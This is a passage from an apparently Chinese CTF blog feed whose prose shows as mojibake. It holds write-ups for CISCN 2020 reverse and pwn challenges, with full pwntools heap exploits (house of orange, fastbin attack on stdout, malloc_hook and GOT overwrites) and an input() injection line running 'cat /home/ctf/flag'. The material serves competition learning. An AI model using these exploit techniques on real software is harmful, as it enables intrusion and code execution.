†å—çš„ã€‚ç„¶è€Œåœ¨case2ä¸­åœ¨editæ—¶ä¹Ÿæ²¡æœ‰å¯¹å †å—åºå·çš„æ£€æŸ¥,è®©ä¸ªäººè¾“å…¥ä¸ª8 å³å¯å–åˆ°è¿™é‡Œï¼Œè¿›è¡Œç¼–è¾‘ã€‚</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>house of orangeæ¥è·å–ä¸€ä¸ªunsortbin </li><li>ç”³è¯·ä¸€ä¸ªå †å—ï¼Œä¼šåœ¨è¿™ä¸ªold top chunkä¸­ï¼Œåˆ‡å‡ºä¸€ä¸ªå †å—ï¼Œå…¶ä¸Šä¼šå­˜åœ¨libcçš„ç›¸å…³åœ°å€</li><li>showä¸€ä¸‹ï¼Œæ³„æ¼å‡ºlibc base</li><li>leave <code>__malloc_hook - 0x60</code>çš„åœ°å€åœ¨<code>key</code> å¤„ï¼Œç„¶åè¿›è¡Œç¼–è¾‘è¿™é‡Œçš„æ•°æ®ã€‚</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./Just_a_Galgame&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def edit(idx,data):    sla(&quot;&gt;&gt;&quot;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))    sa(&#39;name&#39;,str(data))def show():    sla(&#39;&gt;&gt;&#39;,&#39;4&#39;)def add():    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)def add100():    sla(&#39;&gt;&gt;&#39;,&#39;3&#39;)def leave(buf):    sla(&#39;&gt;&gt;&#39;,&#39;5&#39;)    s(str(buf))add()payload = &#39;\x00&#39;*8 + p64(0xd41)edit(0,payload)add100()add()show()ru(&#39;1: &#39;)libc_base = uu64(r(6)) - 0x3ec2a0info_addr(&#39;libc&#39;,libc_base)leave(p64(libc_base + 0x3ebc30 - 0x60))one_rec = 0x4f3c2 + libc_baseedit(8,p64(one_rec))add()itr()</code></pre><p>è¿˜æ˜¯æŒºç®€å•çš„ï¼Œæ¯”èµ›æ—¶ç«Ÿç„¶æ²¡æœ‰çœ‹è¿™ä¸ªé¢˜ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cicsn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®</title>
    <link href="/2020/08/20/cicsn%202020%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <url>/2020/08/20/cicsn%202020%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="cicsn-2020åˆèµ›éƒ¨åˆ†é¢˜ç›®"><a href="#cicsn-2020åˆèµ›éƒ¨åˆ†é¢˜ç›®" class="headerlink" title="cicsn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®"></a>cicsn 2020åˆèµ›éƒ¨åˆ†é¢˜ç›®</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h3><p>ï¿¼<br>çœ‹èµ·æ¥åƒæ˜¯éé½æ¬¡çº¿æ€§æ–¹ç¨‹ï¼Œé‚£å°±æ˜¯å°±æ˜¯ä¸€ä¸ªè§£æ–¹ç¨‹:</p><pre><code class="python">from numpy import *import numpy as npa = np.array([[12, 53, 6,34,58,36,1],            [83,85,12,73,27,96,52],            [78,53,24,36,86,25,46],            [39,78,52,9,62,37,84],            [23,6,14,74,48,12,83],            [27,85,92,42,48,15,72],            [4,6,3,67,0,26,68]])b = np.array([[20247],[40182],[36315],[36518],[26921],[39185],[16546]])result=[]x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[12094],[25270],[19330],[18540],[16386],[21207],[11759]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[10460],[25613],[21135],[24891],[18305],[27415],[12855]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[10899],[24927],[20670],[22926],[18006],[23345],[12602]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[12304],[26622],[19807],[22747],[14233],[24736],[10064]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[14169],[35155],[28962],[33273],[21796],[35185],[14877]])x = np.linalg.solve(a, b)result += x.tolist()flag=&#39;&#39;for i in result:    for f in i:        flag+=chr(int(f+0.5))print(flag)</code></pre><h3 id="hyperthreading"><a href="#hyperthreading" class="headerlink" title="hyperthreading"></a>hyperthreading</h3><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>ä¸»ç¨‹åºå¾ˆç®€å•ï¼Œè¦æ±‚è¾“å…¥42ä½çš„flagã€‚</p><pre><code>  Handles = CreateThread(0, 0, StartAddress, 0, 0, 0);  v5 = CreateThread(0, 0, loc_401200, 0, 0, 0);  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401240, 0, 0, 0);  WaitForMultipleObjects(2u, &amp;Handles, 1, 0xFFFFFFFF);</code></pre><p>è¿™é‡Œå¼€å§‹å¼€å¤šçº¿ç¨‹ã€‚</p><pre><code>void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter){  while ( !IsDebuggerPresent() )    ;  puts((int)&quot;debug!\n&quot;);  exit(0);}</code></pre><p>è¿™é‡Œé¢åˆ†åˆ«æœ‰ä¸€ä¸ªåè°ƒè¯•ã€‚ç”¨çš„IsDebuggerPresentã€‚<br>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼<br>è¿˜æœ‰å¯¹ä½ è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œä»¥åä¸</p><pre><code>402150 key             db 0DDh,5Bh,9Eh,1Dh,20h,9Eh,90h,91h,2 dup(90h),91h.rdata:00402150                                         ; DATA XREF: main1+96â†‘r.rdata:00402150                 db 92h,0DEh,8Bh,11h,0D1h,1Eh,9Eh,8Bh,51h,11h.rdata:00402150                 db 50h,51h,8Bh,9Eh,2 dup(5Dh),11h,8Bh,90h,12h,91h.rdata:00402150                 db 50h,12h,0D2h,91h,92h,1Eh,9Eh,90h,0D2h,9Fh</code></pre><p>è¿™42ä¸ªæ•°æ®è¿›è¡Œå¯¹æ¯”ã€‚</p><p>é‚£ä¹ˆæ€è·¯å°±æ˜¯è¿‡äº†åè°ƒè¯•ï¼Œå®šä½å…³é”®å¤„ç†è¾“å…¥çš„ä»£ç å¤„ï¼Œè¿›è¡Œç¡®å®šå…¶æ˜¯æ€ä¹ˆæ“ä½œæ•°æ®çš„ï¼Œä½†æ˜¯çœ‹äº†ä¸€ä¼šæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±å¼€å§‹æƒ³åŠæ³•å¯»æ‰¾å­—ç¬¦æ˜ å°„æ¥ç¢°æ’flagã€‚</p><pre><code>1 &gt; 0x922 &gt; 0xd23 &gt; 0x124 &gt; 0x515 &gt; 0x916 &gt; 0xd17 &gt; 0x118 &gt; 0x509&gt; 0x900 &gt; 0x52a &gt; 0x9ec &gt; 0x1ed &gt; 0x5d s &gt; 0x22- &gt; 0x8bf &gt; 0xddl &gt; 0x5ba &gt; 0x9eg &gt; 0x1d</code></pre><pre><code>key = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90,  0x91, 0x90, 0x90,   0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51,   0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90,   0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90,   0xD2, 0x9F]</code></pre><p>ç„¶åè¿›è¡Œä¸€ä½ä½æ›¿æ¢ï¼Œè·å¾—flagï¼š</p><pre><code>flag{a959951b-76ca-4784-add7-93583251ca92}</code></pre><p>ä¸»ç¨‹åºå¾ˆç®€å•ï¼Œè¦æ±‚è¾“å…¥42ä½çš„flagã€‚</p><pre><code>  Handles = CreateThread(0, 0, StartAddress, 0, 0, 0);  v5 = CreateThread(0, 0, loc_401200, 0, 0, 0);  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_401240, 0, 0, 0);  WaitForMultipleObjects(2u, &amp;Handles, 1, 0xFFFFFFFF);</code></pre><p>å¼€å§‹æ–°çš„çº¿ç¨‹ï¼š</p><pre><code>void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter){  while ( !IsDebuggerPresent() )    ;  puts((int)&quot;debug!\n&quot;);  exit(0);}</code></pre><p>è¿™æœ‰ä¸€ä¸ªåè°ƒè¯•ã€‚ç”¨çš„IsDebuggerPresentï¼Œè¿‡çš„åŠæ³•å¾ˆç®€å•ï¼Œåœ¨x64dbgä¸­åœ¨è¿›å…¥IsDebuggerPresentæ—¶ï¼Œè¾“å…¥dbhï¼Œéšè—è°ƒè¯•å™¨å³å¯ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/BPs5Q6.png" srcset="/img/loading.gif" alt></p><p>æµ‹è¯•åœ¨è¿™é‡Œdbhå³å¯ã€‚<br>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼<br>è¿˜æœ‰å¯¹ä½ çš„inputè¿›è¡Œå¤„ç†ï¼Œå¤„ç†å®Œä»¥åä¸<br><img src="http://qiqianyun.chumen77.xyz/uPic/vXxpNH.png" srcset="/img/loading.gif" alt></p><p>è¿™42ä¸ªæ•°æ®è¿›è¡Œå¯¹æ¯”ã€‚</p><p>å…ˆè¿‡äº†åè°ƒè¯•ï¼Œå®šä½å…³é”®å¤„ç†è¾“å…¥çš„ä»£ç å¤„ï¼ˆ0x401223ï¼‰ï¼Œè¿›è¡Œç¡®å®šå…¶æ˜¯æ€ä¹ˆæ“ä½œæ•°æ®çš„ï¼Œçœ‹äº†ä¸€ä¼šå‘ç°æ²¡æœ‰å¦‚æ­¤ç®€å•ï¼Œä½†æ˜¯å‘ç°ä½ è¾“å…¥ç‰¹å®šå­—ç¬¦ï¼Œç»è¿‡ç¨‹åºå¤„ç†å‡ºæ¥çš„éƒ½æ˜¯ä¸€æ ·çš„:</p><p>éšæ„è¾“å…¥<code>flag{==2332311111111111111111122222222211}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/vXXqPj.png" srcset="/img/loading.gif" alt></p><p>å¯ä»¥æ‰“å°å­—ç¬¦ä¸ç®—å¤šï¼Œè¿™å°±å¯ä»¥å¯ä»¥å»ºç«‹ä¸€ä¸ªæ˜ å°„è¡¨ï¼š<br>è¾“å…¥<code>flag{1234567890qwertyuiopasdfghjkbnmmmmmm}</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/3GOgJx.png" srcset="/img/loading.gif" alt></p><p>å¤„ç†å®Œï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/zsN4o0.png" srcset="/img/loading.gif" alt><br>è·å–æ˜ å°„è¡¨ï¼š</p><pre><code>1 &gt; 0x922 &gt; 0xd23 &gt; 0x124 &gt; 0x515 &gt; 0x916 &gt; 0xd17 &gt; 0x118 &gt; 0x509&gt; 0x900 &gt; 0x52f &gt; 0xddl &gt; 0x5ba &gt; 0x9eg &gt; 0x1da &gt; 0x9ec &gt; 0x1ed &gt; 0x5d s &gt; 0x22- &gt; 0x8b</code></pre><p>æå–ä¸€ä¸‹keyï¼š</p><pre><code>key = [0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90,  0x91, 0x90, 0x90,  0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51,   0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90,   0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90, 0xD2, 0x9F]</code></pre><p>ç„¶åè¿›è¡Œä¸€ä½ä½æ›¿æ¢ï¼Œè·å¾—flagï¼š</p><pre><code>flag{a959951b-76ca-4784-add7-93583251ca92}</code></pre><h4 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h4><p>å¯ä»¥ç¡®å®šä¸€ä¸‹idaæ— æ³•è¯†åˆ«çš„æ•°æ®æ®µï¼Œæ˜¯è¢«èŠ±æŒ‡ä»¤å¤„ç†è¿‡äº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/yY437o.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œå¼€å§‹å¾€ä¸‹è¯†åˆ«å¼‚å¸¸ï¼Œåœ¨åŠ¨æ€è°ƒè¯•åï¼Œæå–ä¸€ä¸‹æ­£ç¡®çš„æ±‡ç¼–ä»£ç ï¼Œæ ¹æ®æ­£ç¡®çš„ç®—æ³•è¿›è¡Œpatchæ‰èŠ±æŒ‡ä»¤ã€‚ï¼ˆè¿˜æ˜¯æ³¨æ„dbhéšè—ä¸€ä¸‹è°ƒè¯•å™¨ã€‚ï¼‰</p><pre><code class="c">void __stdcall __noreturn sub_401120(LPVOID lpThreadParameter){  int v1; // ebx  CreateThread(0, 0, hHandle, 0, 0, 0);  WaitForSingleObject(hHandle, 0xFFFFFFFF);  inputs[0] = (inputs[0] &lt;&lt; 6) ^ ((signed int)(unsigned __int8)inputs[0] &gt;&gt; 2);  inputs[0] ^= 0x23u;  Sleep(6u);  v1 = *(unsigned __int8 *)(__readfsdword(0x30u) + 2);  inputs[0] += 0x23;  JUMPOUT(loc_4011EC);}</code></pre><p>Patch åçš„ï¼Œå‹‰å¼ºå¯ä»¥çœ‹æ‡‚ã€‚å…¶ä¸­è‚¯å®šæ˜¯<code>inputs[i]</code>è¿›è¡Œå¤„ç†çš„ï¼Œå…¶ä¸­ä¹Ÿæœ‰ä¸€ä¸ªåœ°æ–¹åœ¨åŠ 1ã€‚</p><pre><code class="python">key = [    0xDD, 0x5B, 0x9E, 0x1D, 0x20, 0x9E, 0x90, 0x91, 0x90, 0x90,     0x91, 0x92, 0xDE, 0x8B, 0x11, 0xD1, 0x1E, 0x9E, 0x8B, 0x51,     0x11, 0x50, 0x51, 0x8B, 0x9E, 0x5D, 0x5D, 0x11, 0x8B, 0x90,     0x12, 0x91, 0x50, 0x12, 0xD2, 0x91, 0x92, 0x1E, 0x9E, 0x90,     0xD2, 0x9F]flag = &#39;&#39;for i in range(len(key)):    key[i] -= 0x23    key[i] &amp;= 0xff #æœ‰å¯èƒ½è¿ç®—åä¼šå°äº0çš„ï¼Œæ‰€ä»¥ç»™å¤„ç†ä¸€ä¸‹    key[i] ^= 0x23    key[i] = ((key[i] &gt;&gt; 6) ^ (key[i] &lt;&lt; 2)) &amp; 0xff    flag += chr(key[i])print(flag)</code></pre><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h3><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>ubuntu 16ï¼Œoff by oneï¼Œæ²¡æœ‰showå‡½æ•°ï¼Œéœ€è¦æ”»å‡»stdoutæ³„æ¼libcåœ°å€ã€‚</p><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li>ç”¨off by oneï¼Œæ„é€ å‡ºchunk overlapping ,å¹¶ä¸”æƒ³åŠæ³•é‡Šæ”¾å †å—ï¼Œè®©<code>main_arena_</code>è½åœ¨fastbinä¸­</li><li>ä¿®æ”¹è¿™ä¸ª<code>main_arena_</code>çš„æœ€å2ä¸ªå­—èŠ‚ï¼Œè®©å…¶æŒ‡å‘<code>stdout</code>é™„è¿‘å¸¦æœ‰<code>0x7f</code>çš„åœ°å€ï¼ˆå±äº0x70çš„fastbinå †å—ï¼‰</li><li>ä½¿ç”¨chunk overlapping ï¼Œæ¥ä¿®æ”¹ç©ºé—²çš„fastbin chainï¼Œä½¿å…¶ä¸­ä¸€ä¸ªæŒ‡å‘è¿™ä¸ªå¸¦æœ‰<code>main_arena</code>çš„å †å—ï¼Œè¿›è¡Œfastbin attackï¼Œä¿®æ”¹åˆ°stdoutå¤„çš„å†…å®¹ï¼Œleak libc</li><li>é‡å¤ä»¥ä¸Šçš„æ­¥éª¤ï¼Œæ„é€ ä¸€ä¸ªå †å—åˆ°<code>malloc_hook</code>å¤„ï¼Œå†™ä¸Šone gadget å³å¯ã€‚</li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;101.200.53.148&#39;,34521)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def alloca(idx,size,data):    sla(&quot;&gt;&quot;,&#39;1&#39;)    sla(&#39;idx&#39;,str(idx))    sla(&#39;len&#39;,str(size))    sa(&#39;content&#39;,str(data))def free(idx):    sla(&#39;&gt;&gt;&gt;&#39;,&#39;2&#39;)    sla(&#39;idx&#39;,str(idx))# def pwn():def leak_addr():    alloca(0,1,&#39;aa&#39;)    alloca(1,0x4f0,&#39;\xdd\xd5&#39;)    alloca(2,0xb0,&#39;aa&#39;)    alloca(3,0x60,&#39;aa&#39;)    free(0)    alloca(0,0x18,&#39;/bin/sh\x00&#39;*2 + p64(0) + &#39;\xc1&#39;)    free(1)    alloca(1,0x60,&#39;\xdd\xd5&#39;)    alloca(4,0x60,&#39;\x50\x47&#39;)    alloca(5,0x60,&#39;\x50\x47&#39;)    alloca(6,0x60,&#39;\x50\x47&#39;)    alloca(7,0x30,&#39;aa&#39;)    alloca(8,0x160,&#39;aaaaaa&#39;)    alloca(9,0x60,&#39;aa&#39;)    alloca(10,0x30,&#39;aa&#39;)    free(7)    alloca(0,0x38, p64(0) * 7 + &#39;\xe1&#39;)    free(8)    free(4)    free(9)    free(5)    payload = &#39;a&#39; * 0x160    alloca(11,0x180,payload)    payload = &#39;a&#39; * 0x160 + p64(0) + p64(0x71) + &#39;\x20&#39;    alloca(11,0x180,payload)    alloca(12,0x60,&#39; &#39;)    # debug()    alloca(13,0x60,&#39; &#39;)    alloca(14,0x60,&#39;\xed\xca&#39;)    payload = &#39;a&#39; * 3 + p64(0) * 6 + p64(0xfbad3c80)+p64(0)*3+p8(0)    alloca(15,0x60,payload)# leak_addr()leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(10)        leak = uu64(r(6))        if leak == 0x7ff81b57b6a3:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        io = process(&#39;./pwn&#39;)        # io = remote(&#39;101.200.53.148&#39;,34521)        continueinfo_addr(&#39;leak&#39;,leak)libc_base = leak - 0x3c56a3info_addr(&#39;libc_base&#39;,libc_base)rec = 0xf1207 + libc_basedef getshell():    alloca(7,0x60,&#39; &#39;)    alloca(8,0x60,&#39; &#39;)    free(0)    free(11)    free(6)    alloca(5,0x60,&#39; &#39;)    alloca(4,0x60,&#39; &#39;)    alloca(0,0x60,&#39;\xed\xca&#39;)    free(4)    free(13)    free(12)    payload = &#39;a&#39; * 0x80 + p64(0) + p64(0x71) + &#39;\x90&#39;    alloca(13,0x90,payload)    alloca(11,0x60,&#39;\x20\xd0&#39;)    alloca(6,0x60,&#39;\x20\xd0&#39;)    alloca(4,0x60,&#39;\x20\xd0&#39;)    payload = &#39;a&#39; * 3 + p64(0) * 2 + p64(rec)    alloca(5,0x60,payload)    # debug()    sleep(0.1)    # alloca(8,30,&#39;1&#39;)getshell()itr()</code></pre><p>æ·±å¤œå†™çš„expï¼Œä¼°è®¡æ„é€ å †å—çš„æ€è·¯æœ‰ç‚¹æ··ä¹±ã€‚ğŸ¤£ğŸ¤£</p><h3 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h3><p>æ¯”èµ›æ—¶æ²¡æœ‰åšå‡ºæ¥ï¼Œå¼€å§‹ä»¥ä¸ºæ˜¯ä¸ªwebpwnï¼Œä¸æ•¢å»åšã€‚ä½†æ˜¯å¾ˆå¤šé˜Ÿä¼åšå‡ºæ¥äº†ï¼Œè¯•ç€å»åšï¼Œçœ‹åˆ°server.py,ä¸äº†è§£jscï¼Œä»¥ä¸ºåªèƒ½æ‰§è¡Œjsä»£ç ï¼ŒåºŸäº†å¾ˆå¤§ç²¾åŠ›å†™jsæ¥è¯»å–flagï¼Œè¿˜æ˜¯æ²¡æœ‰æˆåŠŸã€‚tclã€‚</p><p>æœ€åçœ‹wpï¼ŒçŸ¥é“äº†inputå‡½æ•°æœ¬èº«å°±æ˜¯ä¸ªæ¼æ´å‡½æ•°ï¼Œå…¶ä¼šå°†stdinè¾“å…¥çš„å†…å®¹å½“åšpythonä»£ç å»æ‰§è¡Œï¼ˆå°±åƒæ‰§è¡Œè®¡ç®—å¼ä¸€æ ·ï¼Œå°†å…¶çœ‹åšpythonä»£ç ï¼Œé€šè¿‡è®¡ç®—è¿”å›ç»“æœï¼‰ã€‚å½“ç„¶å¯ä»¥ç”¨å®ƒæ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸è¿‡éœ€è¦å…ˆå€’å…¥osçš„æ¨¡å—ï¼Œç„¶åæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><pre><code class="python">__import__(&#39;os&#39;).system(&#39;cat /home/ctf/flag&#39;)</code></pre><p>å¯¹äºpythonï¼Œinputå‡½æ•°æ¼æ´ï¼Œå‚è€ƒé“¾æ¥ï¼š<br><a href="https://blog.csdn.net/weixin_34221332/article/details/92713257" target="_blank" rel="noopener">https://blog.csdn.net/weixin_34221332/article/details/92713257</a></p><h3 id="no-free"><a href="#no-free" class="headerlink" title="no free"></a>no free</h3><h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><pre><code class="python">*] &#39;/ctf/work/ciscn2020/pwn/nofree/pwn&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>å¯ä»¥çœ‹åˆ°ä¿æŠ¤å¼€çš„è¿˜æ˜¯å¾ˆå°‘çš„ï¼Œç„¶åno free æ˜æ˜¾éœ€è¦ä½¿ç”¨åˆ°hos of orangeè¿›è¡Œæ”»å‡»äº†ã€‚</p><h5 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h5><ul><li>åªèƒ½ç”³è¯·0-0x90å¤§å°çš„å †å—ï¼Œå †å—å·è‡ªå®šä¹‰0-2ï¼Œä¸”ç”±äºæ²¡æœ‰å¯¹å·²ç»å­˜åœ¨çš„å †å—å·éªŒè¯ï¼Œå¯ä»¥è¿›è¡Œæ— é™æ¬¡çš„ç”³è¯·åŒä¸€ä¸ªåºå·çš„å †å—ã€‚</li><li>å †å—åœ°å€å­˜åœ¨äº<code>0x06020C0  + 0x100</code> size è·Ÿåœ¨åé¢ã€‚</li><li><code>strdup</code> ç›¸å½“äº<code>malloc(stren(s))</code> </li></ul><h5 id="editå‡½æ•°"><a href="#editå‡½æ•°" class="headerlink" title="editå‡½æ•°"></a>editå‡½æ•°</h5><ul><li>å€˜è‹¥è¾“å…¥æ²¡æœ‰å­˜åœ¨çš„å †å—idxï¼Œç¨‹åºä¼šç›´æ¥è¿”å›</li><li><code>read_diy(key[2 * idx + 0x20], (unsigned __int64)key[2 * idx + 0x21]);</code> è¿™é‡Œç”±äºæ˜¯è¿™æ ·çš„åˆ¤æ–­ï¼Œç»“åˆaddçš„<code>strdup</code> å°±é€ æˆäº†å †æº¢å‡ºã€‚</li></ul><h4 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><p>éš¾ç‚¹åŸºæœ¬å°±åœ¨æ³„æ¼libcäº†ã€‚</p><ul><li>åˆ©ç”¨ç¨‹åºçš„å †æº¢å‡ºæ¼æ´ï¼Œä¿®æ”¹ä¸€ä¸‹top chunk</li><li>ç”³è¯·å¤šæ¬¡0å·0x90çš„å †å—ï¼Œæ¥æ¶ˆè€—ä¿®æ”¹åçš„top chunkï¼Œåˆ°è¾¾ä¸€å®šç¨‹åº¦åè¿›è¡Œhos of orangeæ”»å‡»ï¼Œè·å–ä¸€ä¸ªç©ºé—²çš„è¿›å…¥fastbinçš„å †å—</li><li>åˆ©ç”¨å †æº¢å‡ºï¼Œåœ¨fastbin chainä¸ŠåŠ ä¸€ä¸ª<code>0x06020C0  + 0x100</code> ï¼Œå‡†å¤‡è¿›è¡Œfastbin attackï¼Œæ¥è·å–ä¸€ä¸ªåœ¨å­˜æ”¾å †å—åœ°å€çš„å †å—ï¼Œè¿™æ ·å°±å®ç°äº†ä»»æ„åœ°å€å†™ã€‚</li><li>ä¿®æ”¹<code>atoi</code> çš„got è¡¨ä¸º printfï¼Œåˆ›é€ å‡ºä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</li><li>åˆ©ç”¨addä¸­çš„atoiï¼Œå®Œæˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨ï¼Œæ³„æ¼å‡ºlibcåœ°å€</li><li>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¿®æ”¹<code>atoi</code> çš„gotè¡¨ä¸º<code>elf.plt[&#39;atoi&#39;] + 6</code> ï¼Œè®©å…¶å®Œæˆä¸€ä¸‹è§£æï¼Œé‡æ–°æ„é€ å‡ºæ­£å¸¸çš„atoiï¼ˆåŸå› ï¼šæµ‹é€Ÿä¸­å‘ç°ï¼Œç”¨editåŠŸèƒ½è¾“å…¥idxåç›´æ¥é€€å‡ºï¼Œåªèƒ½è®©å…¶æ¢å¤æ­£å¸¸ï¼Œå†è¿›è¡Œä»»æ„åœ°å€å†™ï¼‰</li><li>ä¿®æ”¹<code>atoi</code> çš„gotä¸ºsystemçš„åœ°å€ï¼Œç„¶ååœ¨å‘é€ä¸ª<code>sh</code> ï¼Œå®Œæˆ<code>system(sh)</code></li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timelocal_file  = &#39;./pwn&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27411)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  